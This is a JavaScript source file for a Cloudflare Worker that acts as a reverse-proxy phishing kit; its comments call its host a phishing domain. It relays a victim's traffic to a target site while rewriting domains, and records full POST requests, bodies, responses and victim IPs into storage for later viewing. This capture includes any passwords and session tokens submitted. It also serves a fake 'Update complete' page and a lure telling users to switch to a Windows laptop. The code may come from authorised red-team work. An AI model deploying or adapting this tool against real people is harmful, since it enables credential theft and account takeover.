/**
 * Welcome to Cloudflare Workers! This is your first worker.
 *
 * - Run `npm run dev` in your terminal to start a development server
 * - Open a browser tab at http://localhost:8787/ to see your worker in action
 * - Run `npm run deploy` to publish your worker
 *
 * Learn more at https://developers.cloudflare.com/workers/
 */


import handleViewer from './viewer';

// Export a default object containing event handlers
export default {
	// The fetch handler is invoked when this worker receives a HTTP(S) request
	// and should return a Response (optionally wrapped in a Promise)
	async fetch(request, env, ctx) {
		//Settings start

		// Target and owned domains
		const targetDomain = env.TARGET_DOMAIN
		const httpScheme = env.HTTP_SCHEME || "https://"

		// //Endpoint where actions will be logged. See python server
		// const logsEndopoint = `https://logging.mydomain.io/post`

		//Block mobile and return message
		const allowMobile = false //not used yet
		const returnFailedUA = `<html>
		<head>
		</head>
		<body>
		<b>This action has to be performed from your Windows laptop.</b>
		</body>
		</html>`

		//Stop intercepting and redirect when the last page includes `finalPage` or parameters include `finalParameters`
		const finalPage = `applaunchtoken.cgi`
		const finalParameters = "auth=2"
		const returnCode = 200
		const returnHeaders = new Headers
		returnHeaders.append("Content-type", `text/html`)
		const returnHtml = `<html>
		<head>
		<meta http-equiv="refresh" content="5;url=https://${targetDomain}/styp" />
		</head>
		<body>
		<b>Update complete. Redirecting in 5 seconds...</b>
		</body>
		</html>`
		//Settings end

		const clonereq = await request.clone()



		// You'll find it helpful to parse the request.url string into a URL object. Learn more at https://developer.mozilla.org/en-US/docs/Web/API/URL
		const url = new URL(request.url);
		const hostname = url.hostname;
		let myrootDomain = hostname;
		let subdomain = ""
		let requestBody = request.method !== 'GET' ? await request.text() : null;

		if (url.pathname.startsWith(env.LOGGER_PATH)) {
			return handleViewer.fetch(request, env, ctx);
		}

		// get subdomain if present
		//
		// On a custom phishing domain (e.g. landing.misconfigured.email) the
		// "root domain" is the last two labels and the subdomain is the first
		// one. On the default workers.dev host (e.g.
		// proxy-logger.c0c0n.workers.dev) the label layout is different, so
		// the whole host is treated as the "phishing root" and requests are
		// proxied straight to the target root, keeping the original path.
		const isWorkersDev = hostname.endsWith(".workers.dev");

		if (!isWorkersDev && hostname.split('.').length > 2) {
			myrootDomain = hostname.split('.').slice(-2).join('.');
			subdomain = hostname.split('.')[0];
		}

		console.log('myrootDomain', myrootDomain);
		console.log('subdomain', subdomain);
		console.log('hostname', hostname);

		// replace in the request body hostname with targetDomain
		if (requestBody) {
			requestBody = requestBody.replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN);
		}

		const modifiedRequestInit = {
			body: requestBody,
			headers: new Headers(request.headers),
			method: request.method,
			// Follow the target's own redirects (e.g. www.github.com -> github.com)
			// server-side and return the final response. Using 'manual' would
			// make the worker echo a Location that points back to its own URL,
			// which creates an infinite redirect loop on the workers.dev host.
			redirect: 'follow'
		};

		for (const [key, value] of modifiedRequestInit.headers) {
			modifiedRequestInit.headers.set(key, value.replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN));
		}

		modifiedRequestInit.headers.set('Host', hostname.replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN));

		if(modifiedRequestInit.headers.has("referer")){
			modifiedRequestInit.headers.set("referer", modifiedRequestInit.headers.get("referer").replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN));
		}

		if(modifiedRequestInit.headers.has("origin")){
			modifiedRequestInit.headers.set("origin", modifiedRequestInit.headers.get("origin").replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN));
		}

		// Ask the target for encodings the Workers runtime transparently
		// decodes. Without this the response body may be returned compressed
		// (e.g. gzip) while still carrying the Content-Encoding header, and
		// response.text() would hand back undecodable binary data.
		modifiedRequestInit.headers.set("accept-encoding", "gzip, deflate");

		const targetURL = httpScheme + hostname.replace(new RegExp(myrootDomain, 'g'), env.TARGET_DOMAIN) + url.pathname + url.search.replace(myrootDomain, env.TARGET_DOMAIN);
		console.log('targetURL', targetURL);
		const modifiedRequest = new Request(targetURL, modifiedRequestInit);		
		const response = await fetch(modifiedRequest)

		const content_type = response.headers.get("Content-Type")
		const cloneResp = await response.clone()
		await pushLogs(clonereq, cloneResp, env)

		// Rewrite a value that belongs to the target domain back to this
		// "phishing" domain. In workers.dev mode the "www." prefix is also
		// stripped, because the www. subdomain does not resolve on workers.dev.
		const rewriteToRootDomain = (value) => {
			let out = value.replace(new RegExp(env.TARGET_DOMAIN, 'g'), myrootDomain);
			if (isWorkersDev) {
				out = out.replace(new RegExp('www\\.' + myrootDomain, 'g'), myrootDomain);
			}
			return out;
		};

		if (!content_type || content_type.includes("text") || content_type.includes("javascript")){    
			if (url.pathname.includes(finalPage) || url.search.includes(finalParameters)){
				return new Response(returnHtml, {
					headers: returnHeaders,
					status: returnCode
				})
			}

			var statusCode = response.status;
			var html = await response.text()
			let headers = new Headers(response.headers);
			html = rewriteToRootDomain(html);

			for (const [key, value] of headers) {
				headers.set(key, rewriteToRootDomain(value));
			}

			// The body has already been decoded with response.text(), so it is
			// no longer compressed. Drop Content-Encoding (and the stale
			// Content-Length), otherwise the browser tries to gunzip plain
			// HTML and renders binary garbage.
			headers.delete('Content-Encoding');
			headers.delete('Content-Length');

			return new Response(html, {
				headers: headers,
				status: statusCode
			})
		}
	
		if (url.pathname.includes(finalPage) || url.search.includes(finalParameters)){
			return new Response(returnHtml, {
				headers: returnHeaders,
				status: returnCode
			})
		}
		return response
	},	
};

async function pushLogs(request, response, env){
	// Logging is optional: if no KV namespace is bound (see wrangler.toml)
	// the proxy still works, but requests are not stored and the log
	// viewer returns a 400.
	if (!env.LOGS) {
		return
	}

	const url = new URL(request.url)
	const queryString = url.search
	const method = request.method || ""
	const body = await request.text() || ""
	const responseBody = await response.text() || ""
	const path = url.pathname
	const ip = request.headers.get("CF-Connecting-IP") || "N/A"

	// if not content type, return
  
	if (!response.headers.get("Content-Type") || response.headers.get("Content-Type").includes("css") || response.headers.get("Content-Type").includes("javascript") || response.headers.get("Content-Type").includes("image") || response.headers.get("Content-Type").includes("font") || response.headers.get("Content-Type").includes("video") || response.headers.get("Content-Type").includes("audio") ){
		  return
	  }
	
	if (path === "/favicon.ico" || path === "/robots.txt" || request.method === "OPTIONS" || request.method === "HEAD" || request.method === "GET"){
		return
	}

	let rawRequest = `${method} ${path}${queryString} HTTP/1.1\r\n`
	
	for (const [key, value] of request.headers.entries()) {
	  rawRequest = `${rawRequest}${key}: ${value}\r\n`
	}
  
	let rawResponse = `HTTP/1.1 ${response.status}\r\n`
	for (const [key, value] of response.headers.entries()) {
	  rawResponse = `${rawResponse}${key}: ${value}\r\n`
	}
  
	rawRequest = `${rawRequest}\r\n${body}`
	rawResponse = `${rawResponse}\r\n${responseBody}`
  
	//console.log(rawRequest)
  
	const logBody = {
		request: rawRequest,
		response: rawResponse,
		ip: ip,
		cf: request.cf,
		}
	
	await env.LOGS.put(Date.now(), JSON.stringify(logBody));	
  }